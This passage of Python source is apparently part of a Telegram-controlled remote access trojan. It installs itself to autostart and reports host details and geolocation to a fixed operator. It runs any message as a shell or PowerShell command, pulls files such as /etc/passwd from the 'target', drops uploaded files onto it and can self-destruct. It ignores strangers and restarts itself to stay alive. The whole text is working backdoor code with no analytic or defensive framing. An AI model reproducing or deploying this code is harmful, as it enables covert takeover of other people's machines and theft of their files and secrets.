for _sig in (signal.SIGINT, signal.SIGTERM):
    try:
        signal.signal(_sig, _on_signal)
    except Exception:
        pass
if IS_WIN:
    # Windows-only: Ctrl+Break.
    try:
        signal.signal(signal.SIGBREAK, _on_signal)
    except Exception:
        pass


# =========================================================================== #
# aiogram handlers
# =========================================================================== #
@dp.errors()
async def _on_error(event: ErrorEvent):
    """
    Global error sink. Returning True tells aiogram the error was handled
    and prevents the dispatcher from dying.
    """
    return True


@dp.message(Command("start"))
async def cmd_start(m: Message):
    """/start — send host info + geolocation to the admin."""
    try:
        if not is_adm(m):
            return   # silent for strangers
        await m.answer(await build_online_message())
    except Exception:
        pass


@dp.message(Command("help"))
async def cmd_help(m: Message):
    """
    /help — print the list of available commands.

    Sent as plain text (no Markdown) so paths and examples containing
    backticks or parentheses cannot break the parser.
    """
    try:
        if not is_adm(m):
            return
        await m.answer(
            f"📖 [{CLIENT_NAME}] commands\n\n"
            f"/start — host info + geo\n"
            f"/heartbeat — liveness probe (uptime, PID, offline flag)\n"
            f"/help — this message\n"
            f"/uninstall — remove the client from this machine "
            f"(asks for confirmation)\n"
            f"/getfile <path> — download a file from the target\n"
            f"    example: /getfile C:\\Users\\Public\\log.txt\n"
            f"/putfile <dir> — upload a file from Telegram into <dir>\n"
            f"    example: /putfile C:\\Users\\Public\n"
            f"    (bot will then ask you to send the file)\n"
            f"/cmd <command> — run via cmd.exe (Windows) / sh (Unix)\n"
            f"    example: /cmd dir\n"
            f"/powershell <command> — run via PowerShell (Windows only)\n"
            f"    example: /powershell Get-Process | Select -First 5\n\n"
            f"anything else — shell command (no timeout)\n"
            f"    example: dir\n"
            f"    example: ps aux | head\n\n"
            f"limits:\n"
            f"  • max upload: {MAX_UPLOAD // (1024 * 1024)} MB per file"
        )
    except Exception:
        pass


@dp.message(Command("uninstall"))
async def cmd_uninstall(m: Message):
    """
    /uninstall — ask for confirmation with inline Yes/No buttons.

    The actual teardown happens in `cb_uninstall` when the admin presses
    "Yes". We never touch anything until then, so a stray /uninstall
    cannot accidentally nuke the client.
    """
    try:
        if not is_adm(m):
            return
        kb = InlineKeyboardMarkup(inline_keyboard=[[
            InlineKeyboardButton(text="✅ Yes", callback_data="uninst:yes"),
            InlineKeyboardButton(text="❌ No",  callback_data="uninst:no"),
        ]])
        await m.answer(
            f"⚠️ [{CLIENT_NAME}] are you sure?\n\n"
            f"This will remove autostart entries, the install folder "
            f"and this process.\n"
            f"The bot will stop responding.",
            reply_markup=kb,
        )
    except Exception:
        pass


@dp.callback_query(F.data.startswith("uninst:"))
async def cb_uninstall(cq: CallbackQuery):
    """
    Inline button handler for /uninstall.

    - Non-admin clicks are silently ignored (no reply at all).
    - "yes" -> edit the message, notify, then self-destruct.
    - "no"  -> edit the message, do nothing else.
    """
    try:
        if not cq.from_user or cq.from_user.id != ADMIN_ID:
            return   # silent for strangers
        action = cq.data.split(":", 1)[1]
        if action == "yes":
            try:
                await cq.message.edit_text(f"🗑 [{CLIENT_NAME}] uninstalling...")
            except Exception:
                pass
            await asyncio.sleep(0.4)
            await _safe_send(
                f"🗑 [{CLIENT_NAME}] uninstalling and self-destructing"
            )
            await asyncio.sleep(0.6)
            # Run the destructive part in a worker thread (it does
            # blocking filesystem/subprocess work and ends with os._exit).
            await asyncio.to_thread(self_destruct)
        else:
            try:
                await cq.message.edit_text(f"❌ [{CLIENT_NAME}] cancelled")
            except Exception:
                pass
    except Exception:
        pass


@dp.message(Command("getfile"))
async def cmd_getfile(m: Message):
    """
    /getfile <path> — send a file from the target to the admin.

    Validates the path locally (exists, not a directory, not empty, not
    above the 50 MB Telegram limit) before hitting the API. This gives
    a clear error message instead of a cryptic Telegram API failure.
    """
    try:
        if not is_adm(m):
            return
        raw = (m.text or "").strip()
        parts = raw.split(maxsplit=1)
        if len(parts) < 2 or not parts[1].strip():
            return await m.answer(
                "usage: /getfile <path>\n"
                "example: /getfile C:\\Users\\Public\\log.txt\n"
                "example: /getfile /etc/passwd"
            )

        # Strip surrounding quotes so paths with spaces work when quoted.
        p = Path(parts[1].strip().strip('"').strip("'"))
        if not p.exists():
            return await m.answer(f"❌ not found: {p}")
        if p.is_dir():
            return await m.answer(f"❌ is a directory, not a file: {p}")
        try:
            size = p.stat().st_size
        except Exception as e:
            return await m.answer(f"❌ cannot stat: {e}")
        if size == 0:
            return await m.answer(f"❌ empty file: {p}")
        if size > MAX_UPLOAD:
            return await m.answer(
                f"❌ file too large: {size/1024/1024:.1f} MB "
                f"(limit {MAX_UPLOAD // (1024 * 1024)} MB)"
            )

        try:
            doc = FSInputFile(str(p), filename=p.name)
            await m.answer_document(doc, caption=f"[{CLIENT_NAME}] {p}")
        except Exception as e:
            try:
                await m.answer(f"❌ upload failed: {e}")
            except Exception:
                pass
    except Exception:
        pass


@dp.message(Command("putfile"))
async def cmd_putfile(m: Message):
    """
    /putfile <dir> — arm a one-shot receive mode.

    The next document the admin sends is saved into <dir> under its
    original filename, then the pending state is cleared.
    """
    global _pending_put
    try:
        if not is_adm(m):
            return
        raw = (m.text or "").strip()
        parts = raw.split(maxsplit=1)
        if len(parts) < 2 or not parts[1].strip():
            return await m.answer(
                "usage: /putfile <target_directory>\n"
                "example: /putfile C:\\Users\\Public\n"
                "example: /putfile /tmp"
            )

        d = Path(parts[1].strip().strip('"').strip("'"))
        if not d.exists():
            return await m.answer(f"❌ directory not found: {d}")
        if not d.is_dir():
            return await m.answer(f"❌ not a directory: {d}")

        _pending_put = str(d)
        await m.answer(
            f"📤 send me the file to save into:\n{d}\n\n"
            f"(send as a document, not as a photo)"
        )
    except Exception:
        pass


@dp.message(F.document)
async def cmd_putrecv(m: Message):
    """
    Receive a document while /putfile is pending.

    Filename is sanitized: backslashes normalized to forward slashes,
    then `basename` applied, so `../../etc/passwd` becomes `passwd` and
    cannot escape the target directory.
    """
    global _pending_put
    try:
        if not is_adm(m):
            return
        if not _pending_put:
            return

        d = Path(_pending_put)
        _pending_put = None   # consume: one-shot mode

        fn = (m.document.file_name or "").replace("\\", "/")
        fn = os.path.basename(fn) or f"upload_{_rand(8)}"
        dst = d / fn

        try:
            await bot.download(m.document, destination=dst)
        except Exception as e:
            return await m.answer(f"❌ download failed: {e}")

        try:
            size = dst.stat().st_size
        except Exception:
            size = 0
        await m.answer(f"✅ saved: {dst}\n📦 {size} bytes")
    except Exception as e:
        try:
            await m.answer(f"❌ putfile err: {e}")
        except Exception:
            pass


@dp.message(Command("heartbeat"))
async def cmd_heartbeat(m: Message):
    """Liveness probe: uptime, PID, offline flag, admin status, platform."""
    try:
        if not is_adm(m):
            return
        up = int(time.time() - _start_ts)
        h, rem = divmod(up, 3600)
        mn, sc = divmod(rem, 60)
        await m.answer(
            f"💓 [{CLIENT_NAME}] alive\n"
            f"⏱ uptime: {h}h {mn}m {sc}s\n"
            f"🆔 pid: {os.getpid()}\n"
            f"📡 offline flag: {_offline}\n"
            f"🛡 admin: {is_admin()}\n"
            f"🐧 platform: {'win' if IS_WIN else 'mac' if IS_MAC else 'linux'}"
        )
    except Exception:
        pass


@dp.message(Command("cmd"))
async def cmd_cmd(m: Message):
    """/cmd <command> — run explicitly through cmd.exe / sh."""
    try:
        if not is_adm(m):
            return
        parts = (m.text or "").strip().split(maxsplit=1)
        if len(parts) < 2 or not parts[1].strip():
            return await m.answer("usage: /cmd <command>\nexample: /cmd dir")
        out = await asyncio.to_thread(run_cmd_cmdline, parts[1].strip())
        for chunk in split_msg(out):
            try:
                await m.answer(
                    f"[{CLIENT_NAME}]\n```\n{chunk}\n```",
                    parse_mode="Markdown",
                )
            except Exception:
                try:
                    await m.answer(f"[{CLIENT_NAME}] {chunk}")
                except Exception:
                    pass
    except Exception:
        pass


@dp.message(Command("powershell"))
async def cmd_ps(m: Message):
    """/powershell <command> — run through PowerShell. Windows only."""
    try:
        if not is_adm(m):
            return
        parts = (m.text or "").strip().split(maxsplit=1)
        if len(parts) < 2 or not parts[1].strip():
            return await m.answer(
                "usage: /powershell <command>\n"
                "example: /powershell Get-Process | Select -First 5"
            )
        out = await asyncio.to_thread(run_cmd_ps, parts[1].strip())
        for chunk in split_msg(out):
            try:
                await m.answer(
                    f"[{CLIENT_NAME}]\n```\n{chunk}\n```",
                    parse_mode="Markdown",
                )
            except Exception:
                try:
                    await m.answer(f"[{CLIENT_NAME}] {chunk}")
                except Exception:
                    pass
    except Exception:
        pass


@dp.message(F.text)
async def cmd_exec(m: Message):
    """
    Catch-all text handler — anything not matched above is a shell command.

    Executed in a worker thread (asyncio.to_thread) so the event loop
    stays responsive. Output is chunked and sent as Markdown code fences
    with a plain-text fallback if Markdown parsing fails (stray backticks
    in output are common).
    """
    try:
        if not is_adm(m):
            return
        command = (m.text or "").strip()
        if not command:
            return
        out = await asyncio.to_thread(run_cmd, command)
        for chunk in split_msg(out):
            try:
                await m.answer(
                    f"[{CLIENT_NAME}]\n```\n{chunk}\n```",
                    parse_mode="Markdown",
                )
            except Exception:
                try:
                    await m.answer(f"[{CLIENT_NAME}] {chunk}")
                except Exception:
                    pass
    except Exception:
        pass


# =========================================================================== #
# Lifecycle
# =========================================================================== #
async def notify_admin(text):
    """Best-effort admin notification — failures ignored."""
    try:
        await bot.send_message(ADMIN_ID, text)
    except Exception:
        pass


async def on_startup():
    """One-shot startup: install + autostart + notify admin."""
    try:
        result = await asyncio.to_thread(autostart_install)
    except Exception as e:
        result = f"⚠️ autostart err: {e}"
    await notify_admin((await build_online_message()) + f"\n\n{result}")


async def _notify_back_online():
    """Sent after the polling loop survives 3 seconds without raising."""
    try:
        await notify_admin(
            f"🟢 [{CLIENT_NAME}] back online\n\n{await build_online_message()}"
        )
    except Exception:
        pass


async def polling_loop():
    """
    Run one polling attempt. Returns True on permanent failure, False
    to signal the caller to retry after a delay.

    Connection state tracking via the module-level `_offline` flag:
      * The first transient failure triggers ONE "connection lost"
        message and sets `_offline = True`.
      * Subsequent failures while offline are silent (no spam).
      * When a new poll attempt survives 3 seconds without raising,
        the connection is considered restored: "back online" is sent
        and `_offline` resets to False.

    handle_signals=False prevents aiogram from installing its own
    signal handlers, which would interfere with our shutdown logic.
    """
    global _offline
    poll_task = asyncio.create_task(
        dp.start_polling(bot, handle_signals=False)
    )

    # If we were offline, wait 3 seconds. If the task is still pending,
    # the connection was re-established successfully.
    if _offline:
        _, pending = await asyncio.wait([poll_task], timeout=3.0)
        if poll_task in pending:
            _offline = False
            asyncio.create_task(_notify_back_online())

    try:
        await poll_task
        return False
    except TelegramUnauthorizedError:
        await notify_admin(f"❌ [{CLIENT_NAME}] Invalid token — exiting")
        return True
    except TelegramConflictError:
        await notify_admin(f"⚠️ [{CLIENT_NAME}] Token already in use — exiting")
        return True
    except asyncio.CancelledError:
        return True
    except BaseException as e:
        # Catch BaseException on purpose — even SystemExit shouldn't
        # be allowed to kill the client.
        if not _offline:
            _offline = True
            await notify_admin(
                f"⚠️ [{CLIENT_NAME}] connection lost: "
                f"{type(e).__name__}: {e}"
            )
        return False


async def main():
    """
    Startup once, then loop around polling until a permanent failure.

    Stores the running event loop in `_loop` so signal handlers can
    schedule coroutines on it via `run_coroutine_threadsafe`.
    """
    global _loop
    _loop = asyncio.get_running_loop()
    try:
        await on_startup()
    except Exception:
        pass
    while True:
        if await polling_loop():
            return
        await asyncio.sleep(10)


# =========================================================================== #
# Entry point
# =========================================================================== #
if __name__ == "__main__":
    # Outer guard. The process only exits on:
    #   * permanent Telegram error (propagated from main's return),
    #   * KeyboardInterrupt (Ctrl+C in a console).
    # Anything else -> sleep 10s and restart the whole async runtime.
    while True:
        try:
            asyncio.run(main())
            break
        except KeyboardInterrupt:
            break
        except Exception:
            try:
                import time
                time.sleep(10)
            except Exception:
                pass